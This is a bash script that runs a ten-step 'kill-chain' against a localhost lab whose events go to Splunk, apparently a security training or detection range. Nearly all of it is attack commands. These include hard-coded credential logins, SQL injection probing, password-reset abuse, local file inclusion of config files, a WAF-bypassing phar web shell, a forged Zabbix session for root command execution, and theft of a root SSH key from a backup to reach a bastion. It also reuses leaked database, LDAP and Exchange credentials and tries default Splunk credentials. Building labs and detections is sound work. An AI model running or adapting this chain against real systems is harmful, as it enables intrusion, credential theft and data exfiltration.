#!/usr/bin/env bash
# Drive the full ATB kill-chain against the running lab (host-side, mapped ports).
# Each step prints its result; every step also emits events to Splunk (index=atb).
set -u
H=localhost
b() { printf '\n\033[1;36m=== %s ===\033[0m\n' "$*"; }

b "Step 1a - hard-coded mobile API creds (mobapp)"
curl -s -u 'reg_user:basic*88password!prod99' -H 'Content-Type: application/json' \
  -d '{"phoneNumber":"+380000000000"}' http://$H:8081/register/login; echo

b "Step 1b - unauth Moodle config disclosure (education)"
curl -s -X POST "http://$H:8082/md/blocks/moco_news/ajax.php" --data 'procedure=getPosts'; echo

b "Step 2 - boolean SQLi oracle (www)"
echo -n "  baseline filter[8][490]=1       -> "; curl -sg -o /dev/null -w '%{http_code}\n' "http://$H:8080/shop/catalog/novetly?filter[8][490]=1"
echo -n "  broken   filter[8][490']=1      -> "; curl -sg -o /dev/null -w '%{http_code}\n' "http://$H:8080/shop/catalog/novetly?filter[8][490%27]=1"
echo "  (full extraction: python3 attack/sqli_oracle.py)"

b "Step 3 - supplier self-registration + password reset (supplier)"
curl -s "http://$H:8083/index.php?entryPoint=RegistrationStep3" --data 'user_name=b9atbsup01@guerrillamailblock.com' ; echo
RESP=$(curl -s "http://$H:8083/index.php?entryPoint=GeneratePassword" --data 'user_name=b9atbsup01@guerrillamailblock.com&link=1')
echo "  $RESP"
GUID=$(echo "$RESP" | grep -oE '[0-9a-f-]{36}' | head -1)
curl -s "http://$H:8083/index.php?entryPoint=Changenewpassword&guid=$GUID" --data 'password1=AtbB9Sup2026x!&password2=AtbB9Sup2026x!'; echo

b "Step 4 - LFI (config.php, config_override.php, /etc/hostname)"
curl -s "http://$H:8083/index.php?module=Import&action=RefreshMapping&to_pdf=true" --data 'importFile=config.php&import_module=AOS_Products_Quotes'; echo
curl -s "http://$H:8083/index.php?module=Import&action=RefreshMapping&to_pdf=true" --data 'importFile=/var/www/config_override.php'; echo
curl -s "http://$H:8083/index.php?module=Import&action=RefreshMapping&to_pdf=true" --data 'importFile=/etc/hostname'; echo

b "Step 5 - phar polyglot web-shell (WAF 180KB bypass)"
python3 attack/upload_phar.py "http://$H:8083"

b "Step 6 - Grafana -> forged Zabbix session -> RCE as root"
python3 attack/forge_zabbix_session.py "http://$H:3000" "http://$H:8084" "id; hostname"

b "Step 7 - ZBXD system.run on Jenkins -> pull backup -> SSH bastion"
python3 attack/zbxd_run.py 'id; hostname' "$H" 10050
python3 attack/zbxd_run.py 'cat /mnt/BACKUP/root.tar.gz | base64' "$H" 10050 2>/dev/null | base64 -d > /tmp/atb_root.tar.gz 2>/dev/null \
  && tar -xzf /tmp/atb_root.tar.gz -C /tmp root/.ssh/id_rsa_root 2>/dev/null \
  && chmod 600 /tmp/root/.ssh/id_rsa_root \
  && echo "  recovered key -> bastion:" \
  && ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -i /tmp/root/.ssh/id_rsa_root -p 2210 root@$H 'id; hostname' 2>/dev/null

b "Step 8 - databases + Harbor-leaked creds"
python3 attack/oracle_probe.py "$H" 1581 XX_SUP_PORTAL_RO S0h6jWot2fTLSMm
python3 attack/oracle_probe.py "$H" 1521 SUPP_PORT_READER 'C3KPgME{p=VyYmeTD6BqaIjN2'
python3 attack/oracle_probe.py "$H" 1251 MEDOC HIr3t4G8Zso7
curl -s "http://$H:8085/image/ishop/api/env"; echo
curl -s -X POST "http://$H:8386/bind" --data 'bind_dn=education@atbmarket.com&password=Edu003868$'; echo

b "Step 9 - Exchange EWS with stolen mailbox creds"
curl -s -u 'supplier@atbmarket.com:supplier123569' -H 'Content-Type: text/xml' \
  --data @attack/ews_finditem.xml "http://$H:8444/ews/Exchange.asmx" | grep -oE 'TotalItemsInView="[0-9]+"' | head -1

b "Step 10 - GitLab source via recovered root key + Splunk default creds"
ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -i /tmp/root/.ssh/id_rsa_root -p 2222 root@$H \
  'ls /var/opt/gitlab/git-data/repositories/*/ | grep -c "\.git"' 2>/dev/null | awk '{print "  repos found: "$1}'
echo -n "  splunk web (admin:changeme) -> "; curl -s -o /dev/null -w '%{http_code} (login at http://localhost:8000)\n' http://$H:8000/en-US/account/login 2>/dev/null

b "DONE - open Splunk http://localhost:8000 (admin/changeme), search:  index=atb | sort _time"
